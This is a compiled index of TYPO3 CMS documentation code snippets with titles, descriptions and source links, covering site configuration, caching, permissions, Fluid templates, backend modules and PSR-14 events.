TYPO3\\CMS\\Backend\\Form\\Container\\AbstractContainer;\nuse TYPO3\\CMS\\Core\\Page\\JavaScriptModuleInstruction;\n\nclass SomeContainer extends AbstractContainer\n{\n    public function render(): array\n    {\n        $resultArray = $this->initializeResultArray();\n\n        $resultArray['html'] = 'My HTML code';\n        \n        // Add a JavaScript ES6 module to the result array\n        $resultArray['javaScriptModules'][] = JavaScriptModuleInstruction::create(\n            '@myvendor/my-extension/my-module'\n        );\n        \n        // Or with additional arguments\n        $resultArray['javaScriptModules'][] = JavaScriptModuleInstruction::create(\n            '@myvendor/my-extension/my-module-with-arguments'\n        )->instance(['foo' => 'bar']);\n\n        return $resultArray;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Getting Page Permissions SQL Clause in TYPO3\nDESCRIPTION: Returns a SQL WHERE clause that filters pages based on the user's read permissions. Can be modified to check for edit (2) or delete (4) permissions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendUserObject.rst#2025-04-16_snippet_7\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['BE_USER']->getPagePermsClause(1);\n```\n\n----------------------------------------\n\nTITLE: Including reStructuredText Directives for Authentication Documentation\nDESCRIPTION: This snippet includes necessary directives for the authentication documentation page, sets up indexing, and defines the document structure.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Authentication/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n..  include:: /Includes.rst.txt\n..  index:: pair: Events; Core Authentication\n..  _eventlist-core-authentication:\n\n\n==============\nAuthentication\n==============\n\nThe following list contains :ref:`PSR-14 events <EventDispatcher>`\nin EXT:core, namespace Authentication.\n\n**Contents:**\n\n..  toctree::\n    :titlesonly:\n    :glob:\n\n    *\n```\n\n----------------------------------------\n\nTITLE: Accessing Current Page ID in TYPO3\nDESCRIPTION: Shows how to retrieve the current page ID using routing request attributes instead of TSFE global.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/TSFE/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n$pageArguments = $request->getAttribute('routing');\n$pageId = $pageArguments->getPageId();\n```\n\n----------------------------------------\n\nTITLE: Proper Use of Curly Braces in PHP\nDESCRIPTION: Examines the preferred placement and usage of curly braces in PHP code constructs, specifically functions and control structures.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglPhp/PhpSyntaxFormatting.rst#2025-04-16_snippet_10\n\nLANGUAGE: php\nCODE:\n```\nprotected function getForm()\n{\n    if ($this->extendedForm) {\n        // generate extended form here\n    } else {\n        // generate simple form here\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Displaying Correct Folder Structure for TYPO3 Root\nDESCRIPTION: This code snippet shows the correct folder structure for a TYPO3 installation using Composer. The web root is a 'public' directory within the project root, which provides better security and follows best practices.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/MigrateToComposer/Requirements.rst#2025-04-16_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n$ tree typo3_root\n└── public/\n    ├── index.php\n    ├── fileadmin/\n    ├── typo3/\n    ├── typo3conf/\n    └── typo3temp/\n```\n\n----------------------------------------\n\nTITLE: Referencing AfterPackageDeactivationEvent Class in TYPO3\nDESCRIPTION: Shows the PHP namespace and class reference for the AfterPackageDeactivationEvent that is dispatched after package deactivation in TYPO3's Extension Manager.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Package/AfterPackageDeactivationEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Package\\Event\\AfterPackageDeactivationEvent\n```\n\n----------------------------------------\n\nTITLE: Creating a Fluid-Based Email Template in HTML\nDESCRIPTION: A minimal example of a custom Fluid email template showing the required structure with layout definition and content sections for subject and main content.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Mail/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<f:layout name=\"SystemEmail\" />\n\n<f:section name=\"Subject\">\n    My Custom Subject\n</f:section>\n\n<f:section name=\"Main\">\n    Hello, this is a custom email template!\n</f:section>\n```\n\n----------------------------------------\n\nTITLE: Configuring Base Variants in TYPO3 Site YAML\nDESCRIPTION: Example YAML configuration for base variants in a TYPO3 site, demonstrating different bases for various conditions including application context and environment variables.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/BaseVariants.rst#2025-04-16_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nbase: 'https://example.org/'\nbaseVariants:\n  -\n    base: 'https://example.com/'\n    condition: 'applicationContext == \"Production\"'\n  -\n    base: 'https://staging.example.org/'\n    condition: 'applicationContext == \"Production/Staging\"'\n  -\n    base: 'https://example.local/'\n    condition: 'applicationContext matches \"/^Development/\"'\n  -\n    base: 'https://example.testing/'\n    condition: 'applicationContext == \"Testing\"'\n  -\n    base: '%env(TYPO3_BASE_URL)%'\n    condition: 'getenv(\"TYPO3_BASE_URL\")'\n```\n\n----------------------------------------\n\nTITLE: Configuring Redis Cache Backend for Pages Cache in TYPO3\nDESCRIPTION: Administrator configuration example to switch the 'pages' cache to use a Redis backend with database 3. This would be placed in config/system/additional.php.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CachingFramework/Configuration/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclared(strict_types=1);\n\n// Put the pages cache into a different Redis database by using database number 3\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['caching']['cacheConfigurations']['pages']['backend'] = \\TYPO3\\CMS\\Core\\Cache\\Backend\\RedisBackend::class;\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['caching']['cacheConfigurations']['pages']['options'] = [\n    'database' => 3,\n];\n```\n\n----------------------------------------\n\nTITLE: Adding Category Field to a Table in TYPO3\nDESCRIPTION: This snippet demonstrates how to add a category field to a table by configuring a TCA field of type 'category'. TYPO3 automatically generates the necessary TCA configuration and adds the database column.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Categories/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TCA']['tt_content']['columns']['categories'] = [\n    'config' => [\n        'type' => 'category',\n    ],\n];\n\n\\TYPO3\\CMS\\Core\\Utility\\ExtensionManagementUtility::addToAllTCAtypes(\n    'tt_content',\n    'categories',\n    '',\n    'after:header'\n);\n```\n\n----------------------------------------\n\nTITLE: Configuring TCA for Extbase model\nDESCRIPTION: Provides a TCA configuration example for an Extbase model, aligning with the database table defined earlier. This configuration is essential for the backend representation and data handling of the model.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Domain/Persistence.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\nreturn [\n    'ctrl' => [\n        'title' => 'Something',\n        'label' => 'title',\n        'type' => 'record_type',\n        // …\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Setting Default Mail From Address\nDESCRIPTION: This snippet defines the default email address used when sending emails from TYPO3, ensuring a consistent sender identity in communications.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/MAIL.rst#2025-04-16_snippet_21\n\nLANGUAGE: text\nCODE:\n```\n:Path: $GLOBALS['TYPO3_CONF_VARS']['MAIL']['defaultMailFromAddress']\n:type: text\n:Default: ''\n\nThis default email address is used when no other 'from' address is set for a TYPO3-generated email.\n```\n\n----------------------------------------\n\nTITLE: Checking HTTP Headers with curl in TYPO3 CMS\nDESCRIPTION: This bash command demonstrates how to use curl to check the HTTP headers of a TYPO3 CMS page, specifically to observe the X-Redirect-By header. It's useful for debugging and understanding redirect behavior.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/PageTypes/RedirectHeaders.rst#2025-04-16_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ncurl -I 'https://example.org/examples/pages/link-to-external-url/'\n```\n\n----------------------------------------\n\nTITLE: Handling Requests in TYPO3 Backend Controller\nDESCRIPTION: PHP implementation of the handleRequest method in a backend controller. This method serves as the main entry point for the module, determining which action to execute based on the request and returning the rendered HTML response.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/BackendModule/CreateModule.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n/**\n * Main entry method for the controller.\n */\npublic function handleRequest(ServerRequestInterface $request): ResponseInterface\n{\n    $this->initializeModuleTemplate($request);\n\n    $actionName = $request->getQueryParams()['action'] ?? $request->getParsedBody()['action'] ?? 'debug';\n\n    $result = '';\n    switch ($actionName) {\n        case 'debug':\n            $result = $this->debugAction($request);\n            break;\n    }\n\n    $this->view->setContent($result);\n\n    return new HtmlResponse($this->view->render());\n}\n```\n\n----------------------------------------\n\nTITLE: AfterAutoCreateRedirectHasBeenPersistedEvent Class Definition in TYPO3 CMS\nDESCRIPTION: PHP class that defines an event triggered after an automatic redirect is created and persisted following a page slug change. The class provides methods to access the redirect change item, source, and redirect record details.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Redirects/AfterAutoCreateRedirectHasBeenPersistedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Redirects\\Event;\n\nclass AfterAutoCreateRedirectHasBeenPersistedEvent\n{\n    public function getSlugRedirectChangeItem(): \\TYPO3\\CMS\\Redirects\\RedirectUpdate\\SlugRedirectChangeItem\n    {\n        // Implementation not shown\n    }\n\n    public function getSource(): \\TYPO3\\CMS\\Redirects\\RedirectUpdate\\RedirectSourceInterface\n    {\n        // Implementation not shown\n    }\n\n    public function getRedirectRecord(): array\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Using AfterFileMetaDataUpdatedEvent in TYPO3\nDESCRIPTION: PSR-14 event implementation for handling file metadata updates in TYPO3. This event is dispatched after metadata of a file has been updated, allowing for custom processing of metadata fields.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Resource/AfterFileMetaDataUpdatedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Resource\\Event\\AfterFileMetaDataUpdatedEvent\n```\n\n----------------------------------------\n\nTITLE: Storage-Specific Permissions in TYPO3 TSconfig\nDESCRIPTION: Example configuration granting full permissions for a specific storage (uid 1). Demonstrates how to set granular permissions per storage that override default settings.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/Administration/Permissions.rst#2025-04-16_snippet_1\n\nLANGUAGE: typoscript\nCODE:\n```\npermissions.file.storage.1 {\n  addFile      = 1\n  readFile     = 1\n  writeFile    = 1\n  copyFile     = 1\n  moveFile     = 1\n  renameFile   = 1\n  deleteFile   = 1\n  addFolder    = 1\n  readFolder   = 1\n  writeFolder  = 1\n  copyFolder   = 1\n  moveFolder   = 1\n  renameFolder = 1\n  deleteFolder = 1\n  recursivedeleteFolder = 1\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Author Meta Tag in TYPO3 CMS TypoScript\nDESCRIPTION: This snippet demonstrates how to set the author meta tag in TYPO3 CMS using TypoScript. It's typically placed in the site package's setup.typoscript file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Seo/Configuration/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: typoscript\nCODE:\n```\n..  literalinclude:: _snippets/_metatags-author.typoscript\n    :caption: packages/my_site_package/Configuration/Sets/SitePackage/setup.typoscript\n```\n\n----------------------------------------\n\nTITLE: Setting OpenGraph Image Fallbacks in TYPO3 TypoScript\nDESCRIPTION: This TypoScript code sets fallback images for og:image and twitter:image meta tags using page properties and default images.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Seo/Configuration/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: typoscript\nCODE:\n```\npage {\n  meta {\n    og:image.stdWrap.cObject = IMG_RESOURCE\n    og:image.stdWrap.cObject {\n      file {\n        import.data = levelmedia:-1, slide\n        treatIdAsReference = 1\n        import.listNum = 0\n      }\n      stdWrap.ifEmpty.cObject = IMG_RESOURCE\n      stdWrap.ifEmpty.cObject.file = EXT:my_site_package/Resources/Public/Images/facebook.png\n    }\n    twitter:image.stdWrap.cObject < .og:image.stdWrap.cObject\n    twitter:image.stdWrap.cObject.stdWrap.ifEmpty.cObject.file = EXT:my_site_package/Resources/Public/Images/twitter.png\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring PHP-CS-Fixer for TYPO3 Projects\nDESCRIPTION: PHP configuration file for PHP-CS-Fixer, extending TYPO3 coding standards and specifying directories to analyze.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/ProjectTesting.rst#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\n..  literalinclude:: _ProjectTesting/_php-cs-fixer.dist.php\n    :caption: Build/php-cs-fixer/.php-cs-fixer.dist.php\n```\n\n----------------------------------------\n\nTITLE: Setting up Module Template in Backend Controller\nDESCRIPTION: PHP code demonstrating how to construct a backend module controller using the ModuleTemplate class. Shows dependency injection and initialization of the template view.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/BackendModule/CreateModule.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace T3docs\\Examples\\Controller;\n\nuse Psr\\Http\\Message\\ResponseInterface;\nuse Psr\\Http\\Message\\ServerRequestInterface;\nuse TYPO3\\CMS\\Backend\\Attribute\\AsController;\nuse TYPO3\\CMS\\Backend\\Template\\ModuleTemplate;\nuse TYPO3\\CMS\\Core\\Http\\HtmlResponse;\n\n/**\n * Admin module controller\n */\n#[AsController]\nclass AdminModuleController\n{\n    protected ModuleTemplate $view;\n\n    public function __construct()\n    {\n        $this->view = ModuleTemplate::new();\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining ModifyRecordListRecordActionsEvent Class in PHP\nDESCRIPTION: This snippet defines the ModifyRecordListRecordActionsEvent class in the TYPO3\\CMS\\Backend\\RecordList\\Event namespace. The class provides methods to modify record actions in the TYPO3 RecordList.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyRecordListRecordActionsEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Backend\\RecordList\\Event;\n\nclass ModifyRecordListRecordActionsEvent\n{\n    // Class methods will be defined here\n}\n```\n\n----------------------------------------\n\nTITLE: Using Boolean Literals in Fluid Templates\nDESCRIPTION: Demonstrates using the boolean literals {true} and {false} to enable or disable properties of tag-based ViewHelpers in Fluid 4.0.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/Syntax.rst#2025-04-16_snippet_5\n\nLANGUAGE: html\nCODE:\n```\n<my:viewhelper async=\"{true}\" />\nResult: <tag async=\"async\" />\n\n<my:viewhelper async=\"{false}\" />\nResult: <tag />\n```\n\n----------------------------------------\n\nTITLE: TYPO3 Console Command Registry Example\nDESCRIPTION: Demonstrates writing run information to the registry from a console command\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SystemRegistry/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Registry;\nuse Symfony\\Component\\Console\\Command\\Command;\n\nclass MyCommand extends Command\n{\n    private Registry $registry;\n\n    public function __construct(Registry $registry)\n    {\n        $this->registry = $registry;\n        parent::__construct();\n    }\n\n    protected function execute(InputInterface $input, OutputInterface $output): int\n    {\n        // Store when command was executed\n        $this->registry->set('tx_myextension', 'lastRun', time());\n\n        return Command::SUCCESS;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing an XCLASS in TYPO3 PHP\nDESCRIPTION: This code snippet shows how to implement an XCLASS by extending the original class and overriding a specific method. It demonstrates adding custom content to the new record wizard screen.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Xclasses/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\nclass NewRecordController extends \\TYPO3\\CMS\\Backend\\Controller\\NewRecordController\n{\n    protected function renderNewRecordControls(ServerRequestInterface $request): void\n    {\n        parent::renderNewRecordControls($request);\n        $ll = 'LLL:EXT:examples/Resources/Private/Language/locallang.xlf'\n        $label = $GLOBALS['LANG']->sL($ll . ':help');\n        $text = $GLOBALS['LANG']->sL($ll . ':make_choice');\n        $str = '<div><h2 class=\"uppercase\" >' .  htmlspecialchars($label)\n            . '</h2>' . $text . '</div>';\n        $this->code .= $str;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Using AfterFileRemovedFromIndexEvent in TYPO3\nDESCRIPTION: The PSR-14 event is triggered after a file has been removed from the sys_file database table. This event allows listeners to perform additional file management operations outside of TYPO3's index.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Resource/AfterFileRemovedFromIndexEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Resource\\Event\\AfterFileRemovedFromIndexEvent\n```\n\nLANGUAGE: SQL\nCODE:\n```\nsys_file\n```\n\n----------------------------------------\n\nTITLE: Accessing TYPO3 Backend Route Attributes in PHP\nDESCRIPTION: Shows how to retrieve the route attribute from a backend request and access module configuration. Uses the TYPO3 backend routing system to get route information.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/RequestAttributes/Route.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$route = $request->getAttribute('route');\n$moduleConfiguration = $route->getOption('moduleConfiguration');\n```\n\n----------------------------------------\n\nTITLE: Using Notification API with RequireJS in TYPO3 Backend\nDESCRIPTION: Example of using the Notification API in TYPO3 backend with legacy RequireJS syntax for backward compatibility with TYPO3 v11, displaying various flash message types.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FlashMessages/NotificationApi.rst#2025-04-16_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\ndefine(['TYPO3/CMS/Backend/Notification'], function(Notification) {\n  'use strict';\n\n  // Show a notice (blue)\n  Notification.notice('Notice', 'This is a notice message');\n\n  // Show an info (blue)\n  Notification.info('Information', 'Some useful information');\n\n  // Show a success message (green)\n  Notification.success('Well done', 'The action was executed successfully.');\n\n  // Show a warning (yellow)\n  Notification.warning('Warning', 'Something went wrong.');\n\n  // Show an error (red)\n  Notification.error('Error', 'This action cannot be executed.');\n\n  // A notification that will not disappear\n  Notification.success('So awesome', 'The notification will stay forever!', 0);\n});\n\n```\n\n----------------------------------------\n\nTITLE: Configuring TYPO3 404 Error Handler with Fluid Template\nDESCRIPTION: YAML configuration example showing how to set up a 404 error handler using a Fluid template in TYPO3. The configuration specifies the error code, handler type, and template paths.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/ErrorHandling/FluidErrorHandler.rst#2025-04-16_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nerrorHandling:\n  - errorCode: 404\n    errorHandler: Fluid\n    errorFluidTemplate: 'EXT:my_sitepackage/Resources/Private/Templates/Sites/Error.html'\n    errorFluidLayoutsRootPath: 'EXT:my_sitepackage/Resources/Private/Layouts/Sites/'\n    errorFluidPartialsRootPath: 'EXT:my_sitepackage/Resources/Private/Partials/Sites/'\n```\n\n----------------------------------------\n\nTITLE: Creating Warning Modal with Severity in TYPO3\nDESCRIPTION: Shows how to create a simple warning modal using the severity parameter to visually indicate the warning level.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/Modules/Modals.rst#2025-04-16_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nTYPO3.Modal.confirm('Warning', 'You may break the internet!', TYPO3.Severity.warning);\n```\n\n----------------------------------------\n\nTITLE: Extending Exceptions with Additional Arguments in PHP\nDESCRIPTION: Shows how to extend exception classes to include additional information through constructor arguments. Highlights maintaining immutability of exceptions by avoiding setters.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/PhpArchitecture/WorkingWithExceptions.rst#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\npublic function __construct(\\n    string \\$message = \\\"\\\",\\n    int \\$code = 0,\\n    \\\\Throwable \\$previous = null,\\n    string \\$additionalArgument = '',\\n    int \\$anotherArgument = 0,\\n) {\\n    // ... the logic\\n}\n```\n\n----------------------------------------\n\nTITLE: Defining PackageInitializationEvent Class in TYPO3 CMS Core API\nDESCRIPTION: This snippet defines the PackageInitializationEvent class with various methods for package initialization and storage management. It includes methods to get package information, container, emitter, and manipulate storage entries.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Package/PackageInitializationEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n..  php:namespace::  TYPO3\\CMS\\Core\\Package\\Event\n\n..  php:class:: PackageInitializationEvent\n\n    Event that is triggered after a package has been activated (or required in composer\n    mode), allowing listeners to execute initialization tasks, such as importing static data.\n\n    ..  php:method:: getExtensionKey()\n        :returns: `string`\n\n    ..  php:method:: getPackage()\n        :returns: `\\TYPO3\\CMS\\Core\\Package\\PackageInterface`\n\n    ..  php:method:: getContainer()\n        :returns: `?\\Psr\\Container\\ContainerInterface`\n\n    ..  php:method:: getEmitter()\n        :returns: `?object`\n\n    ..  php:method:: hasStorageEntry(string $identifier)\n        :returns: `bool`\n\n        :param $identifier: the identifier\n\n    ..  php:method:: getStorageEntry(string $identifier)\n        :returns: `\\TYPO3\\CMS\\Core\\Package\\PackageInitializationResult`\n\n        :param $identifier: the identifier\n\n    ..  php:method:: addStorageEntry(string $identifier, ?mixed $data)\n\n        :param $identifier: the identifier\n        :param $data: the data\n\n    ..  php:method:: removeStorageEntry(string $identifier)\n\n        :param $identifier: the identifier\n```\n\n----------------------------------------\n\nTITLE: Defining a Value Object with Named Arguments in PCPP\nDESCRIPTION: This snippet showcases a value object implementation using public constructor property promotion (PCPP) in PHP. Named arguments are emphasized for instantiating objects to maintain API consistency.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/PhpArchitecture/NamedArguments.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\nfinal readonly class Label implements \\JsonSerializable\n{\n    public function __construct(\n        public string $label,\n        public string $color = '#ff8700',\n        public int $priority = 0,\n    ) {}\n\n    public function jsonSerialize(): array\n    {\n        return get_object_vars($this);\n    }\n}\n\n$label = new Label(\n    label: $myLabel,\n    color: $myColor,\n    priority: -1,\n);\n```\n\n----------------------------------------\n\nTITLE: Modal Trigger with Data Attributes in HTML\nDESCRIPTION: HTML example showing how to trigger a modal using data attributes on an anchor element, which provides a declarative way to configure modals.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/Modules/Modals.rst#2025-04-16_snippet_5\n\nLANGUAGE: html\nCODE:\n```\n<a href=\"#\"\n   class=\"t3js-modal-trigger\"\n   data-title=\"Warning\"\n   data-bs-content=\"Are you sure you want to delete record?\">\n  Delete\n</a>\n```\n\n----------------------------------------\n\nTITLE: Setting Default Mail From Name\nDESCRIPTION: This snippet specifies the default sender name used in TYPO3-generated emails when no other name is provided. It helps in branding the sender's identity.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/MAIL.rst#2025-04-16_snippet_22\n\nLANGUAGE: text\nCODE:\n```\n:Path: $GLOBALS['TYPO3_CONF_VARS']['MAIL']['defaultMailFromName']\n:type: text\n:Default: ''\n\nThis default name is used when no other 'from' name is set for a TYPO3-generated email.\n```\n\n----------------------------------------\n\nTITLE: Fetching and Loading File Collections in a TYPO3 Controller\nDESCRIPTION: This code demonstrates how to retrieve file collections using the FileCollectionRepository and load their contents. It handles retrieving collections by UID or retrieving all collections, then iterates through them calling loadContents() to populate the files before passing them to the view.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/Collections/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\nnamespace MyVendor\\MyExtension\\Controller;\n\nuse TYPO3\\CMS\\Core\\Resource\\FileCollectionRepository;\nuse TYPO3\\CMS\\Extbase\\Mvc\\Controller\\ActionController;\n\nclass MyController extends ActionController\n{\n    /**\n     * @var FileCollectionRepository\n     */\n    protected $collectionRepository;\n\n    /**\n     * Inject the file collection repository\n     *\n     * @param FileCollectionRepository $collectionRepository\n     */\n    public function injectFileCollectionRepository(FileCollectionRepository $collectionRepository)\n    {\n        $this->collectionRepository = $collectionRepository;\n    }\n\n    /**\n     * List action\n     */\n    public function listAction()\n    {\n        // Get all collections\n        $collections = $this->collectionRepository->findAll();\n        // Or get a specific collection\n        // $collections = [$this->collectionRepository->findByUid(1)];\n\n        // Don't forget to load the contents for each collection\n        foreach ($collections as $collection) {\n            $collection->loadContents();\n        }\n\n        $this->view->assign('collections', $collections);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Multiple Modules Retrieval Method\nDESCRIPTION: Method to retrieve all modules with options for grouping and access control checks.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Backend/ModuleProvider.rst.txt#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\nphp:method:: getModules(?\\TYPO3\\CMS\\Core\\Authentication\\BackendUserAuthentication $user = NULL, bool $respectWorkspaceRestrictions = true, bool $grouped = true)\n:returns: `\\ModuleInterface[]`\n```\n\n----------------------------------------\n\nTITLE: Fluid Template Location for Extension Actions (HTML)\nDESCRIPTION: Illustrates the common location for Fluid templates within a TYPO3 extension using Extbase.  The template for an action (e.g., \"view\") of a controller (e.g., `NewsController`) is typically located in the `Resources/Private/Templates/[ControllerName]/[ActionName].html` path.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/Resources/Private/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n\"/Resources/Private/Templates/[ControllerName]/[ActionName].html\"\n```\n\n----------------------------------------\n\nTITLE: RST Document Structure for TYPO3 Extension Publishing Guide\nDESCRIPTION: ReStructuredText markup defining the structure and content of a TYPO3 extension publishing guide, including section headers, index entries, and documentation references.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/PublishExtension/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: restructuredtext\nCODE:\n```\n.. include:: /Includes.rst.txt\n.. index:: Extension development; Publishing\n.. _publish-extension:\n\n======================\nPublish your extension\n======================\n\nFollow these steps to release your extension publicly in the TYPO3 world:\n```\n\n----------------------------------------\n\nTITLE: Identifying a Complex Stateful Service\nDESCRIPTION: This code snippet identifies DataHandler as an example of a heavily stateful service. Noted issues include complex state management, making it unsuitable for injection into stateless services due to unpredictable behavior. Such services should instead be created on-demand.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/PhpArchitecture/Services.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\n\\TYPO3\\CMS\\Core\\DataHandling\\DataHandler\n```\n\n----------------------------------------\n\nTITLE: Using BeforeFlexFormConfigurationOverrideEvent in TYPO3 CMS\nDESCRIPTION: Example implementation of an event listener for the BeforeFlexFormConfigurationOverrideEvent in TYPO3 CMS, showing how to override FlexForm configurations.\nSOURCE: 